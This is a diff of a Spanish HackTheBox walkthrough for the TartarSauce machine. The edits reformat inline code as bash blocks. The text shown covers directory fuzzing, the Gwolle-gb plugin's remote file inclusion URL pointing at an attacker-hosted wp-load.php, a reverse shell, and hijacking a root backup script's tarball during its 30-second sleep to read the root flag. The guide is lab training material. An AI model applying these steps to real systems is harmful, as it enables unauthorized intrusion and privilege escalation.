@@ -77,14 +77,26 @@ Con firefox navegamos en la web para ver lo que es.
 
 Nada interesante aqui. 
 
-Miramos lo que hay en el `robots.txt` que nmap nos a encontrado. En el `robots.txt` vemos rutas que son **disallow**. 
+Miramos lo que hay en el 
+```bash
+ robots.txt 
+```
+ que nmap nos a encontrado. En el 
+```bash
+ robots.txt 
+```
+ vemos rutas que son **disallow**. 
 
 - **/webservices/tar/tar/source/**
 - **/webservices/monstra-3.0.4/**
 - **/webservices/easy-file-uploader/**
 - **/webservices/phpmyadmin**
 
-Quitando partes de las rutas disalloweadas, vemos que la routa `http://10.10.10.88/webservices` esta forbidden y no estan Not Found como cuando
+Quitando partes de las rutas disalloweadas, vemos que la routa 
+```bash
+ http://10.10.10.88/webservices 
+```
+ esta forbidden y no estan Not Found como cuando
 le ponemos la ruta completa. Esto quiere decir que esta ruta existe y que puede existir otros recursos debajo de ella. Vamos a Fuzzear este directorio.
 
 #### Fuzzing con WFuzz {-}
@@ -93,7 +105,11 @@ le ponemos la ruta completa. Esto quiere decir que esta ruta existe y que puede 
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.88/webservices/FUZZ
 ```
 
-Encontramos un ruta `/webservices/wp/`. Lo chequeamos en firefox. 
+Encontramos un ruta 
+```bash
+ /webservices/wp/ 
+```
+. Lo chequeamos en firefox. 
 
 #### Checkeamos la ruta webservice/wp {-}
 
@@ -103,10 +119,22 @@ Analizando vemos
 - Wapalizer nos dice que es un wordpress
 - En el codigo fuente vemos un tartartsauce.htb
 
-Como se aplica virtualhost routing, añadimos el dominio `tartartsauce.htb` al `/etc/hosts`
+Como se aplica virtualhost routing, añadimos el dominio 
+```bash
+ tartartsauce.htb 
+```
+ al 
+```bash
+ /etc/hosts 
+```
 
 
-Ya se ve la web mejor y podemos mirar la web por `http://tartartsauce.htb/webservices/wp/`
+
+Ya se ve la web mejor y podemos mirar la web por 
+```bash
+ http://tartartsauce.htb/webservices/wp/ 
+```
+
 
 
 ## Evaluacion de vulnerabilidades {-}
@@ -122,15 +150,27 @@ cd SecLists
 cd Discovery/Web-Content/CMS/
 ```
 
-Con **WFUZZ** utilizamos el diccionario de SecList llamado `wp-plugins.fuzz.txt`.
+Con **WFUZZ** utilizamos el diccionario de SecList llamado 
+```bash
+ wp-plugins.fuzz.txt 
+```
+.
 
 ```bash
 wfuzz -c -t 200 --hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
 ```
 
-Encontramos un plugin que se llama `gwolle-gb`
+Encontramos un plugin que se llama 
+```bash
+ gwolle-gb 
+```
 
-Por la web intentamos ver `http://tartartsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/` y no se ve nada. Pero como no nos
+
+Por la web intentamos ver 
+```bash
+ http://tartartsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/ 
+```
+ y no se ve nada. Pero como no nos
 da un NotFound quiere decir que existe. Vamos buscando a ver si encontramos un exploit para este plugin
 
 
@@ -147,10 +187,18 @@ searchsploit -x 38861
 ```
 
 Podemos ver que un parametro GET llamado **abspath** que no esta sanitizado correctamente antes de estar utilizado por la funcion require de PHP.
-Un atacante podria incluir de manera remota un fichero llamado `wp-load.php` para ejecutar su contenido en la web vulnerable. Ademas el exploit 
+Un atacante podria incluir de manera remota un fichero llamado 
+```bash
+ wp-load.php 
+```
+ para ejecutar su contenido en la web vulnerable. Ademas el exploit 
 nos muestra sobre que ruta tendriamos que ejecutar un metodo get para ejecutar el comando
 
-`http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]`
+
+```bash
+ http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website] 
+```
+
 
 La idea aqui seria de comprobar si esto es verdad.
 
@@ -169,13 +217,21 @@ La idea aqui seria de comprobar si esto es verdad.
     ```
 
 Aqui podemos comprobar que la maquina victima no esta enviando una peticion get a nuestro servidor web creado en python. A demas se puede ver que
-la maquina victima esta intentando buscar un fichero `wp-load.php` que por el momento no existe.
+la maquina victima esta intentando buscar un fichero 
+```bash
+ wp-load.php 
+```
+ que por el momento no existe.
 
 ## Explotacion de vulnerabilidad & Ganando Acceso {-}
 
 ### Entablar una reverse shell desde la vulnerabilidad Gwolle {-}
 
-1. Creamos el fichero `wp-load.php` que contiene
+1. Creamos el fichero 
+```bash
+ wp-load.php 
+```
+ que contiene
 
     ```php
     <?php
@@ -397,7 +453,11 @@ while true; do
 done
 ```
 
-Ya podemos ver que hay una tarea `/bin/bash /usr/sbin/backuperer` que se ejecuta a intervalos regulares de tiempo. lo Analizamos.
+Ya podemos ver que hay una tarea 
+```bash
+ /bin/bash /usr/sbin/backuperer 
+```
+ que se ejecuta a intervalos regulares de tiempo. lo Analizamos.
 
 ```bash
 cat /usr/sbin/backuperer
@@ -405,21 +465,65 @@ cat /usr/sbin/backuperer
 
 Aqui vemos un script que:
 
-1. supprime ficheros `/var/tmp/.*` 
-1. supprime el directorio `/var/tmp/check`
-1. comprime todo lo que hay en `/var/www/html` como un fichero `/var/tmp/.<hash>`
-1. sleep 30
-1. crea un directorio `/var/tmp/check`
-1. descomprime `/var/tmp/.<hash>` en `/var/tmp/check`
-1. controla si hay una differencia entre el contenido del hash y `/var/www/html`
-1. si hay differencias, reporta los cambios en el fichero `/var/backup/onuma_backup_error.txt`
+1. supprime ficheros 
+```bash
+ /var/tmp/.* 
+```
+ 
+1. supprime el directorio 
+```bash
+ /var/tmp/check 
+```
 
-La vulnerabilidad de este script reside en el sleep de 30 secundos que nos permitiria borrar el fichero comprimido `.<hash>` y meter
+1. comprime todo lo que hay en 
+```bash
+ /var/www/html 
+```
+ como un fichero 
+```bash
+ /var/tmp/.<hash> 
+```
+
+1. sleep 30
+1. crea un directorio 
+```bash
+ /var/tmp/check 
+```
+
+1. descomprime 
+```bash
+ /var/tmp/.<hash> 
+```
+ en 
+```bash
+ /var/tmp/check 
+```
+
+1. controla si hay una differencia entre el contenido del hash y 
+```bash
+ /var/www/html 
+```
+
+1. si hay differencias, reporta los cambios en el fichero 
+```bash
+ /var/backup/onuma_backup_error.txt 
+```
+
+
+La vulnerabilidad de este script reside en el sleep de 30 secundos que nos permitiria borrar el fichero comprimido 
+```bash
+ .<hash> 
+```
+ y meter
 otro comprimido. Como suponemos que es **root** que ejecuta la tarea, podemos aprovechar de esto para ver la flag de root.
 
 #### Modificacion del comprimido {-}
 
-1. Creamos un comprimido de `/var/www/html`
+1. Creamos un comprimido de 
+```bash
+ /var/www/html 
+```
+
 
     ```bash
     cd /dev/shm
@@ -440,13 +544,21 @@ otro comprimido. Como suponemos que es **root** que ejecuta la tarea, podemos ap
 
 Ahora que tenemos el comprimido en la maquina de atacante, vamos a cambiar su contenido
 
-1. descomprimimos el ficher `.tar`
+1. descomprimimos el ficher 
+```bash
+ .tar 
+```
+
 
     ```bash
     tar -xf comprimido.tar
     ```
 
-1. Modificamos el ficher `index.html`
+1. Modificamos el ficher 
+```bash
+ index.html 
+```
+
 
     ```bash
     cd var/www/html
@@ -506,7 +618,15 @@ Ahora que tenemos el comprimido en la maquina de atacante, vamos a cambiar su co
     ./tehijackeolavida.sh
     ```
 
-Cuando la pantalla nos muestre el mensaje `[+] Archivo hijackeado con exito`, podemos mirar el fichero `/var/backup/onuma_backup_error.txt` 
+Cuando la pantalla nos muestre el mensaje 
+```bash
+ [+] Archivo hijackeado con exito 
+```
+, podemos mirar el fichero 
+```bash
+ /var/backup/onuma_backup_error.txt 
+```
+ 
 y 30 segundos mas tarde tendriamos que ver la flag.
 
 ```bash
